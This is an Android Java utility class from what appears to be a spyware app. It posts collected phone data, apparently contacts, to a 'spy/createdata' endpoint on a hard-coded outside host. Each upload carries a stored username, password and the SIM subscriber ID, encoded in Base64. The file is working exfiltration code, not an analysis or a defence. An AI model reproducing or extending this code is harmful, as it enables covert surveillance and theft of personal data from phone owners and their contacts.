package com.xaviar.utils;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.LinkedList;
import java.util.List;

import org.springframework.http.MediaType;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.http.converter.json.MappingJacksonHttpMessageConverter;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestClientException;
import org.springframework.web.client.RestTemplate;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.preference.PreferenceManager;
import android.util.Base64;
import android.util.Log;

import com.xaviar.collect.phoneparams.PhoneParamsUtil;
import com.xaviar.frm.DataHolder;
import com.xaviar.ui.R;

import flexjson.JSONSerializer;

public class NetworkUtil {

	private static final String TAG = "NetworkUtil";
	
	
	public static  DataHolder processData(String genericData,String holderKey,Context ctx) {
		//System.out.println(name + ": (1) reformat contacts to xml.");
		String serverUrl = getServerUrl(ctx); 
		//System.out.println("serverUrl:" + serverUrl);
		String restUrl = getRestUrl(ctx);
		//System.out.println("restUrl:" + restUrl);
		String url = serverUrl + "/" + restUrl;
		System.out.println("full url:" + url);		
		DataHolder dhReturn = NetworkUtil.sendDataToServerAsObject(url,genericData,holderKey,ctx);
		//GenericUtil.sleep(SLEEP_TIME);
		//System.out.println(name + ": (3) end processData");
		return dhReturn;
		
	}
		public static String getServerUrl(Context ctx)
		{
			SharedPreferences	prefs = (SharedPreferences) PreferenceManager.getDefaultSharedPreferences(ctx);
			String localServerUrl = ctx.getResources().getString(R.string.localServerUrl);
			String cloudServerUrl = ctx.getResources().getString(R.string.cloudServerUrl);//com.xaviar.R.string.cloudServerUrl);
			//String defaultUrl =cloudServerUrl;
			String defaultUrl = getDefaultHost();
			String ret = prefs.getString("serverurl", defaultUrl);	
			return ret;
		}
		
		public static String getRestUrl(Context ctx)
		{
			SharedPreferences	prefs = (SharedPreferences) PreferenceManager.getDefaultSharedPreferences(ctx);
			String defaultUrl ="spy/createdata";	
			String ret = prefs.getString("resturl", defaultUrl);	
			return ret;
		}
	
	public static DataHolder sendDataToServerAsObject(String url,String request,String holderKey,Context ctx) {
		 Log.d(TAG,"sendDataToServerAsObject holderKey:" + holderKey );
		try
		{
		if(null == request || request.length() == 0)
		{
		 //request = "[{name:JHON  Doe,number:064-678-9123,type:HOME}]";
		 request = "[{\"name\":\"Irina  Okraina \",\"number\":\"054-333-6987\",\"type\":\"MOBILE\"},{\"name\":\"JHON  Doe\",\"number\":\"064-678-9123\",\"type\":\"HOME\"}]";
		 Log.d(TAG,"sendDataToServerAsObject replacing data with HARD CODED!!!! ");
		 return null;
		}
		else
		{
			 Log.d(TAG,"sendDataToServerAsObject  data is ORIGINAL DYNAMIC!!!! ");	
		}
		//restTemplate.put(url, request);
		}
		catch(Exception e)
		{
		 e.printStackTrace();
		 return null;
		}
		try {
		RestTemplate rest = NetworkUtil.configureRestTemplatePost();
		MultiValueMap<String, DataHolder> parts = new LinkedMultiValueMap<String, DataHolder>();
		DataHolder dh = new DataHolder();
		dh.put(holderKey,request);
		addFlower(dh,ctx);
		parts.add("request", dh);
		//URI uri = rest.postForLocation(url, parts);
		DataHolder dhRes = rest.postForObject(url, dh,DataHolder.class);
		Log.d(TAG,"getJsonAsStringFromRemote id:"+ dhRes.getId() + " ");
		//System.out.print("URI:" +uri.toString());
		return dhRes;
		}
		catch(Exception e)
		{
			Log.d(TAG,"getJsonAsObjectFromRemote exception:"+ e.getLocalizedMessage()); 
			return null;
		}
	
	}
	
	
	private static void addFlower(DataHolder dh,Context ctx) {
	 if(null != dh.get(DataHolder.FLOWER))
	 {
	  return;	 
	 }
	 
	 Flower flower = new Flower();	 	
	 SharedPreferences	prefs = (SharedPreferences) PreferenceManager.getDefaultSharedPreferences(ctx);
	 
	
	 String user = prefs.getString("username","user");
	 //String user = ctx.getResources().getString(R.string.prefUsernameSummary);
	 //String password = ctx.getResources().getString(R.string.prefPasswordSummary);	
	 String password =  prefs.getString("password","password");
	 flower.setUser(user);
	 flower.setPassword(password);
	 
	 String simSubscriberIdDefaultReal = PhoneParamsUtil.getSubscriberID(ctx);		
	 String simSubscriberId =  prefs.getString("simSubID",simSubscriberIdDefaultReal); 
	 
	 
	 flower.setSimSubscriberId(simSubscriberId);
	 List<Flower> allFlowers = new LinkedList<Flower>();
	 allFlowers.add(flower);
	 String jsonsArray = toJsonArray(allFlowers);		 
	 byte [] encodedBytes = Base64.encode(jsonsArray.getBytes(), Base64.DEFAULT);
     String encodedStr =  new String(encodedBytes);	 	 
	 dh.put(DataHolder.FLOWER,encodedStr);
	}

	
	public static String toJsonArray(Collection<Flower> collection) {
		   return new JSONSerializer().exclude("*.class").serialize(collection);
		}

	// work 001
	public static void sendDataToServerAsString(String url,String request) {
		
		try
		{
		if(null == request || request.length() == 0)
		{
		 request = "[{name:JHON  Doe,number:064-678-9123,type:HOME}]";	
		}
		//restTemplate.put(url, request);
		}
		catch(Exception e)
		{
		 e.printStackTrace();	
		}
		RestTemplate rest = NetworkUtil.configureRestTemplatePost();
		MultiValueMap<String, String> parts = new LinkedMultiValueMap<String, String>();
		parts.add("request", request);
		URI uri = rest.postForLocation(url, parts);
		Log.d(TAG,"getJsonAsStringFromRemote uri:"+ uri + " ");
		System.out.print("URI:" +uri.toString());
		return;
	}

	public static String getJsonAsStringFromRemote(String url) throws RestClientException, UnsupportedEncodingException
	{
		Log.d(TAG,"getJsonAsStringFromRemote url:"+ url);
		RestTemplate restTemplate = NetworkUtil.configureRestTemplateGet();
		String aJsonStringNoUTF =  new String(restTemplate.getForObject(url,String.class).getBytes("ISO-8859-1"), "UTF-8");
		return aJsonStringNoUTF;			
	}
	
	public static RestTemplate configureRestTemplateGet() {
		RestTemplate restTemplate = new RestTemplate();
		List<HttpMessageConverter<?>> msgConvs = restTemplate.getMessageConverters();
		List<HttpMessageConverter<?>> converters = new ArrayList<HttpMessageConverter<?>>(msgConvs);
		MappingJacksonHttpMessageConverter jsonConverter = new MappingJacksonHttpMessageConverter();		
		List<MediaType> supportedMediaTypes = new ArrayList<MediaType>();
		supportedMediaTypes.add(new MediaType("application", "json"));
		supportedMediaTypes.add(new MediaType("charset", "UTF-8"));
		jsonConverter.setSupportedMediaTypes(supportedMediaTypes);		
		converters.add(jsonConverter);
		restTemplate.setMessageConverters(converters);		
		return restTemplate;
	}

	public static RestTemplate configureRestTemplatePost() {
		RestTemplate restTemplate = new RestTemplate();
		List<HttpMessageConverter<?>> msgConvs = restTemplate.getMessageConverters();
		List<HttpMessageConverter<?>> converters = new ArrayList<HttpMessageConverter<?>>(msgConvs);
		MappingJacksonHttpMessageConverter jsonConverter = new MappingJacksonHttpMessageConverter();		
		List<MediaType> supportedMediaTypes = new ArrayList<MediaType>();
		supportedMediaTypes.add(new MediaType("application", "json"));
		supportedMediaTypes.add(new MediaType("charset", "UTF-8"));
		jsonConverter.setSupportedMediaTypes(supportedMediaTypes);
		converters.add(jsonConverter);
		restTemplate.setMessageConverters(converters);		
		return restTemplate;
	}
	
	public static boolean isNetworkAvailable(Context ctx) {
	    ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
	    NetworkInfo networkInfo = cm.getActiveNetworkInfo();
	     // if no network is available networkInfo will be null, otherwise check if we are connected
	    if (networkInfo != null && networkInfo.isConnected()) {
	         return true;
	    }
	    return false;
	}
	
	
	public boolean isNetworkReachable(Context context) {
		ConnectivityManager mManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo current = mManager.getActiveNetworkInfo();
		if (current == null) {
			return false;
		}
		return (current.getState() == NetworkInfo.State.CONNECTED);
	}
	
	public static boolean isWifiReachable(Context context) {
		ConnectivityManager mManager = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo current = mManager.getActiveNetworkInfo();
		if (current == null) {
			return false;
		}
		return (current.getType() == ConnectivityManager.TYPE_WIFI);
	}
	
	public static  boolean isURLReachable(Context context) {
	    ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
	    NetworkInfo netInfo = cm.getActiveNetworkInfo();
	    if (netInfo != null && netInfo.isConnected()) {
	        try {
	        	String serverUrl = getServerUrl(context);
	        	//serverUrl = "http://atlancy.com";
	            URL url = new URL(serverUrl); 
	            HttpURLConnection urlc = (HttpURLConnection) url.openConnection();
	            urlc.setConnectTimeout(10 * 1000);          // 10 s.
	            urlc.connect();
	            if (urlc.getResponseCode() == 200) {        // 200 = "OK" code (http connection is fine).
	                Log.wtf("Connection", "Success !");
	                return true;
	            } else {
	                return false;
	            }
	        } catch (MalformedURLException e1) {
	            return false;
	        } catch (IOException e) {
	            return false;
	        }
	    }
	    return false;
	}
	public static boolean isServerAvailable(Context context) {
		String host = getServerUrl(context);
		int timeoutMilis = 8000;
		try {
			InetAddress.getByName(host).isReachable(timeoutMilis);
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			return false;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return false;
		}
		return true;
	}
	
	public static  String getDefaultHost()
	{
		final String host = "www.atlancy.com";
		return host;
	}
	


}
